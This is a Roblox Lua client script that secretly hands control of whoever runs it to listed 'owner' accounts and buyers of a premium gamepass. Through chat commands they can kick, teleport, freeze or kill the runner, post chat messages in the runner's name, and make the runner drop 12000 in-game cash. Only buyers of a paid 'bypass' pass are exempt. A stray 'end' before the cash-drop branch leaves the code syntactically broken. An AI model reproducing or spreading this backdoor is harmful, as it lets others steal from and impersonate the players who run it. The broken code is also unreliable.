local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ChatService = game:GetService("TextChatService")
local localPlayer = Players.LocalPlayer

-- GAMEPASS ID
local PREMIUM_PASS = 1618296323
local BYPASS_PASS = 1618124347

-- OWNER LIST
local owners = {
    "GameLuaNhau",
    "quayvebenanhdi",
    "3"
}

-- CHECK OWNER
local function isOwner(player)
    for _, name in ipairs(owners) do
        if player.Name == name then
            return true
        end
    end
    return false
end

-- CHECK GAMEPASS
local function ownsPass(player, passId)
    local success, result = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, passId)
    end)
    return success and result
end

-- CHECK BYPASS
local function hasBypass(player)
    return ownsPass(player, BYPASS_PASS)
end

-- CHECK PERMISSION (OWNER OR PREMIUM)
local function hasPermission(player)
    return isOwner(player) or ownsPass(player, PREMIUM_PASS)
end
local function forceSay(msg)
    local chan = ChatService:FindFirstChild("TextChannels")
        and ChatService.TextChannels:FindFirstChild("RBXGeneral")

    if chan then
        pcall(function()
            chan:SendAsync(msg)
        end)
    end
end
-- BRING
local function bringPlayer(owner)
    if localPlayer.Character and owner.Character then
        localPlayer.Character:SetPrimaryPartCFrame(
            owner.Character.HumanoidRootPart.CFrame
        )
    end
end

-- FREEZE / UNFREEZE
local function setFreeze(state)
    if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
        localPlayer.Character.HumanoidRootPart.Anchored = state
    end
end

-- RESET
local function resetPlayer()
    if localPlayer.Character then
        local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

-- DROP CASH
local function dropCash()
    local ev = ReplicatedStorage:FindFirstChild("MainEvent")
    if ev then
        ev:FireServer("DropMoney", "12000")
    end
end

-- CHAT COMMAND HANDLER
local function setupCommands(player)
    player.Chatted:Connect(function(msg)
        -- Bypass thì không bị ảnh hưởng
        if hasBypass(localPlayer) then return end

        -- Owner không bị ảnh hưởng bởi lệnh người khác
        if isOwner(localPlayer) and player ~= localPlayer then return end

        -- Kiểm tra quyền
        if not hasPermission(player) then return end

        if msg == "/kick ." then
            localPlayer:Kick("Premium Has Kicked You.")

        elseif msg == "/bring ." then
            bringPlayer(player)

        elseif msg == "/freeze ." then
            setFreeze(true)

        elseif msg == "/unfreeze ." then
            setFreeze(false)

        elseif msg == "/reset ." then
            resetPlayer()
        elseif string.sub(msg, 1, 5) == "/say " then
            local args = string.split(msg, " ")
        
            -- /say <name> <message>
            if #args >= 3 then
                local targetName = args[2]
        
                -- check username hoặc display
                if string.lower(localPlayer.Name) == string.lower(targetName)
                or string.lower(localPlayer.DisplayName) == string.lower(targetName) then
        
                    -- lấy nội dung sau tên
                    local sayMsg = table.concat(args, " ", 3)
                    forceSay(sayMsg)
                end
            end
        end
        elseif msg == "/dropcash ." then
            dropCash()
        end
    end)
end

-- SETUP CHO TẤT CẢ OWNER + PREMIUM
for _, plr in ipairs(Players:GetPlayers()) do
    if hasPermission(plr) then
        setupCommands(plr)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if hasPermission(plr) then
        setupCommands(plr)
    end
end)
